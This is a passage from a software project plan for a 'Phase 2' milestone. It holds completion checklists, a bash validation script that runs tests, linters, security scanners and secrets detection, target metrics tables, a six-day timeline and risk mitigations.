- [ ] Pre-commit hooks configured and working

### Features
- [ ] Rate limiting working on all endpoints
- [ ] Secrets detection blocking commits
- [ ] E2E tests cover all 5 workflows
- [ ] Performance benchmarks established
- [ ] Security tests comprehensive
- [ ] API documentation complete and published

### Documentation
- [ ] CHANGELOG.md updated
- [ ] README.md enhanced
- [ ] TODO_FIXES.md reflects P3 completion
- [ ] PHASE2_COMPLETION_SUMMARY.md created
- [ ] API docs building successfully
- [ ] GitHub Pages deployed

### CI/CD
- [ ] All CI jobs passing
- [ ] Performance regression detection active
- [ ] Security scanning integrated
- [ ] Documentation auto-builds
- [ ] Pre-commit hooks enforced

---

## 🎯 Final Validation

Before marking Phase 2 complete, run complete validation:

```bash
#!/bin/bash
echo "=========================================="
echo "PHASE 2 FINAL VALIDATION"
echo "=========================================="

echo ""
echo "1. Run ALL tests..."
pytest tests/ -v --cov=src --cov-report=term --cov-report=html || exit 1

echo ""
echo "2. Run E2E tests..."
pytest tests/e2e/ -v || exit 1

echo ""
echo "3. Run performance tests..."
pytest tests/performance/ --benchmark-only || exit 1

echo ""
echo "4. Run security tests..."
pytest tests/security/ -v || exit 1

echo ""
echo "5. Run linters..."
ruff check src/ tests/ || exit 1

echo ""
echo "6. Run security scanners..."
bandit -r src/ -ll || exit 1
safety check || exit 1

echo ""
echo "7. Build documentation..."
cd docs && make html && cd .. || exit 1

echo ""
echo "8. Check pre-commit..."
pre-commit run --all-files || exit 1

echo ""
echo "9. Verify secrets detection..."
detect-secrets scan --baseline .secrets.baseline || exit 1

echo ""
echo "=========================================="
echo "✅ PHASE 2 VALIDATION COMPLETE!"
echo "=========================================="
echo ""
echo "Summary:"
pytest tests/ --cov=src --cov-report=term | grep "TOTAL"
echo ""
echo "Ready for production deployment! 🚀"
```

---

## 📊 Expected Outcomes

### Test Metrics
| Metric | Before Phase 2 | After Phase 2 | Target |
|--------|----------------|---------------|--------|
| Total Tests | 188 | 238+ | 230+ |
| Pass Rate | 100% | 100% | 100% |
| Coverage | 61.07% | 65%+ | 65%+ |
| E2E Tests | 21 | 40+ | 35+ |
| Performance Tests | 0 | 10+ | 10+ |
| Security Tests | 0 | 20+ | 15+ |

### Quality Metrics
| Metric | Status |
|--------|--------|
| Linting | ✅ Passing |
| Type Checking | ✅ Passing |
| Security Scan | ✅ Passing |
| Dependency Audit | ✅ Passing |
| Pre-commit Hooks | ✅ Configured |
| Secrets Detection | ✅ Active |

### Documentation
| Item | Status |
|------|--------|
| API Docs | ✅ Complete |
| User Guide | ✅ Complete |
| Examples | ✅ Complete |
| GitHub Pages | ✅ Deployed |
| README Enhanced | ✅ Done |
| CHANGELOG Updated | ✅ Done |

---

## 🚀 Implementation Timeline

### Day 1: Secrets & Rate Limiting (3 hours)
- Morning: ISSUE-21 (Secrets Scanning) - 1 hour
- Afternoon: ISSUE-20 (Rate Limiting) - 2 hours
- Quality Gates after each

### Day 2: E2E Tests (4 hours)
- Complete ISSUE-17 (E2E Tests) - 4 hours
- Quality Gates after completion

### Day 3: Performance & Security Part 1 (4 hours)
- Morning: ISSUE-18 (Performance Tests) - 4 hours
- Quality Gates after completion

### Day 4: Security Part 2 (4 hours)
- ISSUE-19 (Security Testing) - 4 hours
- Quality Gates after completion

### Day 5: Documentation (6 hours)
- ISSUE-16 (API Documentation) - 6 hours
- Quality Gates after completion

### Day 6: Final Polish (3 hours)
- Update all documentation
- Run final validation
- Create completion summary
- Prepare for deployment

**Total: ~24 hours over 6 days**

---

## ⚠️ Risk Mitigation

### Risk: Tests fail after changes
**Mitigation:** Run quality gates after EACH issue, not at the end

### Risk: Documentation build fails
**Mitigation:** Test Sphinx build locally before committing

### Risk: Performance benchmarks too strict
**Mitigation:** Start with loose benchmarks, tighten based on actual results

### Risk: False positives in security tests
**Mitigation:** Review and document acceptable exceptions

### Risk: Time overruns
**Mitigation:** 20% buffer built into estimates, can skip non-critical tests

---

## 🎉 Ready to Begin!

This plan provides a clear roadmap for completing Phase 2 with:
- ✅ Detailed implementation steps for each issue
- ✅ Comprehensive testing after each change
- ✅ Quality gates to prevent regressions
- ✅ Final documentation updates
- ✅ Clear success criteria

**Next Step:** Execute the plan starting with ISSUE-21! 🚀

---

**Questions or concerns? Review this plan and adjust as needed before starting implementation.**
